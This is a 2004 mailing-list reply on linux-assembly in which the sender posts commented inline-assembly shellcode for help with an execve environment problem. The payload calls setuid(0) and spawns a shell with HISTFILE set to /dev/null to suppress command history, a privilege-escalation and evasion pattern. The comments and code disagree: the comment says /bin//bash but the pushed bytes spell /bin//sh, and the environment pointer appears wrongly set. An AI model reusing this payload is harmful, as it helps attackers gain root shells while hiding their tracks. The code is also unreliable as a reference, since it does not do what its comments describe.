From: =?iso-8859-1?q?Danett=20song?= <danett18@yahoo.com.br>
Subject: Re: execve with env..
Date: Thu, 27 May 2004 18:05:02 -0300 (ART)
Sender: linux-assembly-owner@vger.kernel.org
Message-ID: <20040527210502.96393.qmail@web90105.mail.scd.yahoo.com>
References: <1085686821.40b644254ebbb@intranet.eprocess.fr>
Mime-Version: 1.0
Content-Transfer-Encoding: 7BIT
Return-path: <linux-assembly-owner@vger.kernel.org>
In-Reply-To: <1085686821.40b644254ebbb@intranet.eprocess.fr>
List-Id: <linux-assembly.vger.kernel.org>
Content-Type: text/plain; charset="us-ascii"
To: fmarmond@eprocess.fr
Cc: linux-assembly@vger.kernel.org

Hi fmarmond,

> I have no time today, but I'll try to help you
> tomorow. 

Thkz a lot! :)

> Can you provide a commented version of your code? 

Yah, look below...

#include <stdio.h> 
  
int main(){ 
  
__asm__( 
        "xor %eax, %eax   \n"  // set 0 to %eax
        "xor %ebx, %ebx   \n"  // 1 arg setuid (zero)
        "mov $0x17, %al   \n"  // call setuid
        "int $0x80        \n"  // kernel mode
        "xor  %eax,%eax   \n"  // set 0 to %eax
        "push %eax        \n"  // put zero at stack
        "push $0x68732F2F \n"  
        "push $0x6E69622F \n"  // put /bin//bash at
stack
        "mov  %esp,%ebx   \n"  // Copy 1arg execve
        "push %eax        \n"  // put zero at stack
        "push %ebx        \n"  // put %ebx at stack
        "mov  %esp, %ecx  \n"  // Copy 2arg execve
        "xor  %edx, %edx  \n"  // set 0 to %edx
        "push $0x6C6C756E \n"  
        "push $0x2F2F7665 \n" 
        "push $0x642F2F3D \n" 
        "push $0x454C4946 \n" 
        "push $0x54534948 \n"  // HISTFILE=//dev//null
        "push %eax        \n"  // put zero at stack
        "mov  %esp, %edx  \n"  // copy 3arg execve
        "mov  $0x0b, %al \n"   // call execve
        "int  $0x80      \n"   // kernel mode
        "xor  %eax,%eax  \n"   // 1arg of exit (zero)
        "mov  $0x01,%al  \n"   // call exit
        "int  $0x80      \n"   // kernel mode
      ); 
  
return(0); 
} 

Thkz,

______________________________________________________________________

Participe da pesquisa global sobre o Yahoo! Mail: 
http://br.surveys.yahoo.com/global_mail_survey_br
